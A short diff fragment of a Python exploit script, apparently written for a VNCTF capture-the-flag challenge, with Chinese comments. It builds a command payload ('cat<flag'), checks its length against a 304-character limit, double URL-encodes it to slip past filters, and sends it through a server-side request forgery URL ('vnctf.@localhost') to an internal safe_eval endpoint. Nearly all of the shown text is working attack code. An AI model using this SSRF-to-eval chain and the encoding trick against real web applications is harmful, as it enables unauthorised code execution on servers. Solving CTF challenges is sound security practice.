@@ -201,7 +201,7 @@ payload = (
 print(f"[*] 正在尝试执行: cat<flag")
 print(f"[*] Payload 长度: {len(payload)} (限制 304)") # 检查长度，这很重要
 
-# 手动url编码
+# 1. 手动url编码
 pass_1_encode = "".join(f"%{ord(c):02x}" for c in payload)
 # 2. 双重编码 (% -> %25)
 pass_2_encode = pass_1_encode.replace("%", "%25")
@@ -209,7 +209,6 @@ pass_2_encode = pass_1_encode.replace("%", "%25")
 # 3. 拼接
 full_url = f"{TARGET_URL}/fetch?url=http://vnctf.@localhost:8080/__internal/safe_eval?hi={pass_2_encode}"
 
-print(pass_2_encode)
 # 4. 发送
 try:
     res = requests.get(full_url)
